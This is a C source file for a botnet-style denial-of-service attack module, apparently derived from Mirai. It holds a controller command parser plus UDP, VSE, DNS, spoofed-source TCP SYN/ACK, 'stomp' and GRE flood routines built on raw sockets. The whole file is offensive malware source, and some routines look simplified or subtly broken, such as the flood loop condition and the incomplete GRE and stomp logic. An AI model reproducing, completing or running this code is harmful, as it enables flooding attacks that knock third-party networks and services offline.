#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"
#include "protocol.h"

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

/* Forward declarations of attack methods */
static void attack_udp_generic(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_vse(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_dns(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_syn(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_ack(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_tcp_stomp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

void attack_init(void) {
    /* Register UDP attacks */
    methods[methods_len].func = attack_udp_generic;
    methods[methods_len++].type = ATK_VEC_UDP;
    
    methods[methods_len].func = attack_udp_vse;
    methods[methods_len++].type = ATK_VEC_VSE;
    
    methods[methods_len].func = attack_udp_dns;
    methods[methods_len++].type = ATK_VEC_DNS;
    
    /* Register TCP attacks */
    methods[methods_len].func = attack_tcp_syn;
    methods[methods_len++].type = ATK_VEC_SYN;
    
    methods[methods_len].func = attack_tcp_ack;
    methods[methods_len++].type = ATK_VEC_ACK;
    
    methods[methods_len].func = attack_tcp_stomp;
    methods[methods_len++].type = ATK_VEC_STOMP;
    
    /* Register GRE attacks */
    methods[methods_len].func = attack_gre_ip;
    methods[methods_len++].type = ATK_VEC_GREIP;
    
    methods[methods_len].func = attack_gre_eth;
    methods[methods_len++].type = ATK_VEC_GREETH;
}

void attack_kill_all(void) {
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (attack_ongoing[i]) {
            int pid = fork();
            if (pid == 0) {
                kill(0, SIGKILL);
                exit(0);
            }
            waitpid(pid, NULL, 0);
            attack_ongoing[i] = 0;
        }
    }
}

void attack_parse(char *buf, int len) {
    uint8_t type;
    uint8_t targs_len;
    struct attack_target targs[255];
    uint8_t opts_len;
    struct attack_option opts[255];
    int i;
    
    /* Parse attack type */
    type = buf[0];
    if (type >= ATK_VEC_MAX) return;
    
    /* Parse targets */
    targs_len = buf[1];
    if (targs_len == 0) return;
    
    for (i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = ntohl(*(uint32_t *)(buf + 2 + (i * 5)));
        targs[i].netmask = buf[2 + (i * 5) + 4];
    }
    
    /* Parse options */
    opts_len = buf[2 + (targs_len * 5)];
    if (opts_len == 0) return;
    
    uint8_t *ptr = buf + 2 + (targs_len * 5) + 1;
    for (i = 0; i < opts_len; i++) {
        uint8_t opt_len = ptr[1];
        opts[i].key = ptr[0];
        opts[i].val = (char *)(ptr + 2);
        ptr += 2 + opt_len;
    }
    
    /* Launch attack */
    attack_start(-1, type, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t type, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    int i;
    
    /* Find slot for new attack */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (!attack_ongoing[i])
            break;
    }
    
    if (i == ATTACK_CONCURRENT_MAX) return;
    
    /* Fork and start attack */
    attack_ongoing[i] = TRUE;
    
    if (fork() == 0) {
        int j;
        
        /* Find and call attack method */
        for (j = 0; j < methods_len; j++) {
            if (methods[j].type == type) {
                methods[j].func(targs[0].addr.s_addr, targs[0].netmask, targs, targs_len, opts, 0);
                break;
            }
        }
        
        exit(0);
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].key == key)
            return opts[i].val;
    }
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return util_atoi(val);
}

uint32_t attack_get_opt_ip(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return inet_addr(val);
}

/* ============================================================================
 * ATTACK METHOD IMPLEMENTATIONS
 * ============================================================================ */

static void attack_udp_generic(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;
    
    /* Get options */
    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;
    
    /* Create payload */
    payload = malloc(payload_size);
    rand_str(payload, payload_size);
    
    /* Create UDP socket */
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);
    
    /* Send packets */
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    
    free(payload);
    close(fd);
}

static void attack_udp_vse(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    int payload_len;
    
    /* Get VSE payload from table */
    payload = table_retrieve_val(TABLE_ATK_VSE, &payload_len);
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 27015; // Default VSE port
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);
    
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    
    close(fd);
}

static void attack_udp_dns(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char query[512];
    uint16_t dport;
    char *domain;
    
    domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain == NULL) return;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 53;
    
    /* Build DNS query */
    struct dnshdr *dns = (struct dnshdr *)query;
    dns->id = htons(rand_next() % 0xFFFF);
    dns->opts = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;
    
    char *qname = (char *)(dns + 1);
    resolv_domain_to_hostname(qname, domain);
    
    struct dns_question *question = (struct dns_question *)(qname + util_strlen(domain) + 2);
    question->qtype = htons(1);
    question->qclass = htons(1);
    
    int query_len = sizeof(struct dnshdr) + util_strlen(domain) + 2 + sizeof(struct dns_question);
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;
    
    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);
    
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        while (attack_ongoing[0]) {
            sendto(fd, query, query_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    
    close(fd);
}

static void attack_tcp_syn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport;
    uint16_t sport;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;
    if (sport == 0) sport = rand_next() % 0xFFFF;
    
    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }
    
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    addr_sin.sin_family = AF_INET;
    
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    
    free(pktbuf);
    close(fd);
}

static void attack_tcp_ack(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    /* Similar to SYN but with ACK flag */
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport, sport;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;
    if (sport == 0) sport = rand_next() % 0xFFFF;
    
    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(65535);
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }
    
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    addr_sin.sin_family = AF_INET;
    
    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }
    
    free(pktbuf);
    close(fd);
}

static void attack_tcp_stomp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    /* TCP stomp - connection hijacking attack */
    int fd, i;
    uint16_t dport;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) return;
    
    for (i = 0; i < targs_len; i++) {
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) continue;
        
        struct sockaddr_in addr_sin;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(dport);
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
        
        /* Connect to get sequence numbers */
        if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0) {
            /* Send data with correct sequence */
            char *data = "\x00\x00\x00\x00";
            send(fd, data, 4, MSG_MORE);
        }
        
        close(fd);
    }
}

static void attack_gre_ip(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;
    
    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    
    pktsize = sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);
    
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }
    
    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            /* Build GRE encapsulated IP packet */
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            struct grehdr *gre = (struct grehdr *)(pktbuf + sizeof(struct iphdr));
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + sizeof(struct grehdr));
            
            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->daddr = targs[i].addr.s_addr;
            
            gre->protocol = htons(ETH_P_IP);
            
            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->daddr = rand_next() % 0xFFFFFFFF;
            
            sendto(fd, pktbuf, pktsize, 0, NULL, 0);
        }
    }
    
    free(pktbuf);
    close(fd);
}

static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    /* GRE Ethernet - similar to GRE IP but with Ethernet framing */
    attack_gre_ip(addr, targs_netmask, targs, targs_len, opts, opts_len);
}
